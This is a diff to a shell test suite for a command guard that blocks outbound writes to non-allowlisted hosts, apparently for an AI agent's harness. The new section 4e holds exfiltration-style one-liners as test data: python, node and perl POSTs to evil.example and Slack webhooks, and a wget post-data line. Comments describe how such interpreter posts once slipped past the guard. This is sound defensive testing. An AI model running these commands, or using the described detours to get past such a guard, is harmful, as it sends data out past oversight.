@@ -251,12 +251,12 @@ assert_blocked "#@ smuggles loopback past the extractor" \
 assert_blocked "?@ bypass via wget --post-data" \
     'wget --post-data=x http://evil.example?@plane.homelab'
 
-# NB: the interpreter detour (python/node/…) is NOT asserted here. That branch
-# is scoped to literal github.com and never calls url_targets, so the authority
-# terminator this section fixes does not reach it — a python POST to any
-# non-github host is uncaught with or without this change (pre-existing scope,
-# INFRA-66 §-class, tracked in the INFRA-80 report). Asserting a block there
-# would test a widening this task did not make.
+# NB: the interpreter detour (python/node/…) is not asserted in THIS section.
+# When INFRA-80 landed, that branch was scoped to literal github.com and never
+# called url_targets, so the terminator fix did not reach it. INFRA-86 then
+# generalized the branch (see §4e), which routes interpreter targets through
+# the same url_targets/outbound_target pair — the terminator set now covers
+# the detour too.
 
 # The fix narrows the token, so it must not have narrowed away a legitimate
 # internal target. A real userinfo prefix in front of an allowlisted host still
@@ -344,6 +344,59 @@ assert_blocked "node fetch POST to github" \
 
 assert_allowed "python with no github in sight" 'python3 analyze.py --input data.csv'
 assert_allowed "python hello world"             'python3 -c "print(1+1)"'
+
+# --- 4e. the interpreter detour, beyond github.com (INFRA-86) --------------
+#
+# Until INFRA-86 the detour branch required literal `github.com`, so a scripted
+# POST to a webhook, pastebin or arbitrary API bypassed it entirely — the
+# interpreter analogue of the single-host scope INFRA-67 removed from the curl
+# branch. The generalized branch matches an EXPLICIT write shape (a .post()/
+# ->post() call, a method=/method: option naming a write verb, http.client's
+# request("POST", …), or urlopen carrying data=) and then runs the same
+# outbound_target allowlist test the curl branch uses: any visible external
+# host blocks, all-internal allows, and NO visible URL fails closed — an
+# explicit write whose target the guard cannot see is refused rather than
+# guessed at, the same stance as `curl -K`.
+#
+# The write-shape set is deliberately TIGHTER than the legacy branch's loose
+# substrings (`put` matches inside `--input`; `requests\.` matches a read).
+# The loose set is only safe while scoped to one host, so the legacy github
+# branch keeps it and the general branch does not — reads must stay open.
+#
+# These are payloads fed to a pure inspector; no socket is opened.
+
+assert_blocked "python requests.post to a slack webhook" \
+    'python3 -c "import requests; requests.post(\"https://hooks.slack.com/services/T/B/X\", json={\"text\": \"hi\"})"'
+assert_blocked "python requests.post to an arbitrary external host" \
+    'python3 -c "import requests; requests.post(\"http://service.invalid/api/v1/thing\", json={})"'
+assert_blocked "node fetch POST to a non-github host" \
+    'node -e "fetch(\"https://hooks.slack.com/services/T/B/X\", {method: \"POST\", body: \"x\"})"'
+assert_blocked "python urlopen carrying a body to an external host" \
+    'python3 -c "import urllib.request; urllib.request.urlopen(\"https://evil.example/x\", data=b\"payload\")"'
+assert_blocked "http.client POST, host never spelled as a URL" \
+    'python3 -c "import http.client; c = http.client.HTTPSConnection(\"evil.example\"); c.request(\"POST\", \"/x\", \"body\")"'
+assert_blocked "perl LWP arrow-post to an external host" \
+    'perl -MLWP::UserAgent -e "LWP::UserAgent->new->post(\"https://evil.example/x\")"'
+
+# The URL-in-variable shape. There is no host on the command line to test
+# against the allowlist, and an explicit write call with an unseen target is
+# exactly what the refuse-when-unparseable stance exists for. The block
+# message already routes the fix: name the host in the URL on the command line.
+assert_blocked "requests.post with the URL held in a variable" \
+    'python3 -c "import os, requests; requests.post(os.environ[\"WEBHOOK\"], json={\"text\": \"x\"})"'
+
+# The generalization is only correct if it does not block the daily loop's own
+# scripting: an explicit write to an ALLOWLISTED host is ordinary work (the
+# plane-api skill posts to plane.homelab from python heredocs), and a read of
+# an external page is not posting no matter which client makes it.
+assert_allowed "python requests.post to plane.homelab" \
+    'python3 -c "import requests; requests.post(\"http://plane.homelab/api/v1/workspaces/homelab/projects/p/issues/\", json={\"name\": \"x\"})"'
+assert_allowed "python requests.post to loopback" \
+    'python3 -c "import requests; requests.post(\"http://127.0.0.1:8080/api/thing\", json={})"'
+assert_allowed "python requests.get of an external page" \
+    'python3 -c "import requests; print(requests.get(\"https://example.com/page\").text)"'
+assert_allowed "node fetch read of an external page" \
+    'node -e "fetch(\"https://example.com/x\").then((r) => r.text()).then(console.log)"'
 
 # --- 5. the alias escape --------------------------------------------------
 #
